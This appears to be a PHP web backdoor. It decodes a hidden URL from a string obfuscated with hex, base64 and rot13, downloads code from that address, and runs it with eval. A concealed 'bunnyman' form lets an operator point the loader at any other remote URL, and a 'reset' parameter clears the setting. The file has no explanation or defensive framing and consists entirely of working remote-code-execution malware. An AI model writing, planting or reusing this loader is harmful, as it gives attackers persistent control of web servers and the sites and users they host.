<?php session_start();
function bunvisGoat($zr)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $zr);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $rst = curl_exec($ch);
    curl_close($ch);
    return $rst;
}
function cXe($zr)
{
    $hu = '';
    for ($i = 0; $i < strlen($zr); $i++) {
        $hu .= dechex(ord($zr[$i]));
    }
    $bSu = base64_encode($hu);
    return str_rot13($bSu);
}
function cDc($eUr)
{
    $rtgsD = str_rot13($eUr);
    $bsuD = base64_decode($rtgsD);
    $azD = '';
    for ($i = 0; $i < strlen($bsuD); $i += 2) {
        $azD .= chr(hexdec(substr($bsuD, $i, 2)));
    }
    return $azD;
}
$eUr = 'Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL0BGMyAmL2BGpmAwx2ZwMwAwH0Zwp1AzH2MGp5ZzL1ZwL1AwZ2MwplAwD3ZmWzAmV2AGL2AmZlMwL4AwH2ZGL0AmZlMwMxAwR2BGMyZzL0Zwp1AzH2MGp5ZzD0MQL5AzH2BGWzAzD2BGMyAwxlMGpmAwt2AGMwAzZlMGpjAwt3ZN==';
$zr = cDc($eUr);
if (isset($_GET['reset'])) {
    $_SESSION["urBunny"] = "";
    echo "success";
    exit;
}
if (isset($_GET['bunnyman'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['zr'])) {
            $zr = $_POST['zr'];
            $_SESSION["urBunny"] = $zr;
            echo "updated : " . $_SESSION["urBunny"];
            exit;
        } else {
            echo "Error!";
            exit;
        }
    } else {
?>

        <head>
            <style>
                #zr {
                    display: block;
                    margin-bottom: 10px
                }

                form {
                    display: flex;
                    flex-direction: column;
                    align-items: flex-end
                }
            </style>
        </head>

        <body>
            <form action="" method="post"><input id="zr" name="zr" value="<?php echo isset($_POST['zr']) ? $_POST['zr'] : ''; ?>"><br></form>
        </body><?php exit;
            }
        } else {
            if (empty($_SESSION["urBunny"])) {
                $rst = @file_get_contents($zr);
                if (empty($rst)) {
                    $rst = bunvisGoat($zr);
                }
            } else {
                $rst = @file_get_contents($_SESSION["urBunny"]);
                if (empty($rst)) {
                    $rst = bunvisGoat($_SESSION["urBunny"]);
                }
            }
        }
        if (is_string($rst)) {
            eval('?>' . $rst);
        } else {
            echo "Error";
        }
                ?>